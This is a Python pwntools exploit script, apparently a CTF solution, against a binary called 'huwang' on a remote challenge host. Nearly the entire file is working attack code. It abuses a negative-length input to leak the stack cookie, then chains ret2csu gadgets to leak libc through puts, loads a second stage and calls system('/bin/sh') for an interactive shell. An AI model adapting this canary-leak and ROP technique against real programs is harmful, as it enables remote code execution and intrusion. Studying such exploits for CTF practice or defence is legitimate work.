#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import hashlib
context.log_level="debug"
pwn_file="./huwang"
elf=ELF(pwn_file)
libc=elf.libc
pid=0
cookie=0
def hash(x):
    return hashlib.md5(x).hexdigest().decode("hex")
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
def get_cc():
    global pid
    if len(sys.argv)==1:
        r=process(pwn_file)
        pid=r.pid
    else:
        r=remote("49.4.79.184",30658)
        pid=0
    return r

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("cookie:0x%x"%cookie)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

def add(size,content):
    r.sendlineafter(">> \n","1")
    r.sendlineafter("size:",str(size))
    r.sendafter("content:",content)

def delete(idx):
    r.sendlineafter(">> \n","2")
    r.sendlineafter("index:",str(idx))

def brute(r,guess):
    name="a"*25
    r.sendlineafter(">> \n","666")
    r.sendafter("name\n",name)
    pause()
    r.sendlineafter("Do you want to guess the secret?\n",'y')
    r.sendlineafter("encrypt the secret:\n","1")
    r.sendafter("md5 of the secret\n",guess)
    data=r.recvline()
    print data

r=get_cc()
name="a"*25
r.sendlineafter(">> \n","666")
r.sendafter("name\n",name)
r.sendlineafter("Do you want to guess the secret?\n",'y')
r.sendlineafter("encrypt the secret:\n","-1")
r.close()

r=get_cc()
name="a"*0x19
r.sendlineafter(">> \n","666")
r.sendafter("name\n",name)
r.sendlineafter("Do you want to guess the secret?\n",'y')
r.sendlineafter("encrypt the secret:\n","1")
r.sendafter("Try to guess the md5 of the secret\n",hash("\x00"*0x10))
r.recvuntil(name)
cookie=u64("\x00"+r.recv(7))
r.sendafter("What`s your occupation?","a"*0xff)
r.sendafter("[Y/N]\n","Y\n")

def ret2csu(rdi,rsi,rdx,func_got):
    return p64(0)+p64(1)+p64(func_got)+p64(rdx)+p64(rsi)+p64(rdi)+p64(0x401550)+"a"*8
f={
    0x108:p64(cookie)+p64(0x603a00),
    0x118:p64(0x40156A)+ret2csu(elf.got["puts"],0,0,elf.got["puts"])+\
            ret2csu(0,0x603c00,0x100,elf.got["read"])+\
            ret2csu(0x603c08,0,0,0x603c00)
}
r.send(fit(f,filler="\x00"))
r.recvline()
libc.address=u64(r.recvline()[:-1].ljust(8,"\x00"))-libc.sym["puts"]
r.sendline(p64(libc.sym["system"])+"/bin/sh\x00")

r.interactive()




